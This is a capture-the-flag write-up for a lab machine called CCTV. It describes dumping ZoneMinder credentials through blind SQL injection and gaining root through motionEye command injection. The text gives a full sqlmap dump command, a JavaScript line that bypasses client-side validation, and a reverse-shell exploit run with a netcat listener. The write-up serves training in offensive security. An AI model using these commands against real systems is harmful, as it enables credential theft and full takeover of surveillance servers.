CCTV is an easy Linux machine built around a surveillance company called SecureVision. The chain threads through two separate CVEs affecting two different applications, a time-based blind SQL injection in ZoneMinder that leaks credentials, and a command injection in motionEye that runs as root.

## Foothold:

Researching the version turned up **CVE-2024-51482**, a time-based blind SQL injection in the `tid` parameter of ZoneMinder's event tag removal endpoint. The parameter is passed directly into a MySQL query without sanitization. The endpoint requires a valid session, so I grabbed the `ZMSESSID` cookie from the browser's storage tab first.

With the session cookie in hand, I passed the vulnerable endpoint to sqlmap, targeting the `Users` table in the `zm` database.

```bash
~> sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=c2gqvl5lpe65flp7k612ocrppk" -p tid --technique=T --dbms=mysql -D zm -T Users -C Username,Password --dump --batch --level 5 --risk 3 --no-cast
```

## Privilege Escalation: motionEye Command Injection (CVE-2025-60787)

### Tunneling to the Internal Interface

motionEye's web control was bound to localhost on port 8765. I used SSH local port forwarding to expose it on my machine.

```bash
~>  ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

With the tunnel up, navigating to `http://127.0.0.1:8765` in the browser brought up the motionEye login page.

I logged in with `admin` and the SHA-1 hash as the password.


### Exploiting CVE-2025-60787

This version is vulnerable to command injection. Certain camera configuration fields like `image_file_name` are written directly into the underlying Motion config file without sanitization — when Motion reloads, the shell interprets the injected value. Since the service runs as root, so does the injected command.

The web UI has client-side validation blocking special characters. Bypassing it takes one line in the browser console.

<img width="376" height="43" alt="image" src="https://github.com/user-attachments/assets/dc2e555b-ff85-4f31-a2a3-0f54ef9b9791" />


```javascript
configUiValid = function() { return true; };
```

With validation disabled, I cloned the PoC and set up a listener.

```bash
~>  git clone https://github.com/gunzf0x/CVE-2025-60787.git
~>  nc -lnvp 4444
```

Then ran the exploit against the tunneled interface.

```bash
~>  python3 CVE-2025-60787.py revshell \
  --url 'http://127.0.0.1:8765' \
  --user 'admin' \
  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
  -i 10.10.14.184 --port 4444
```
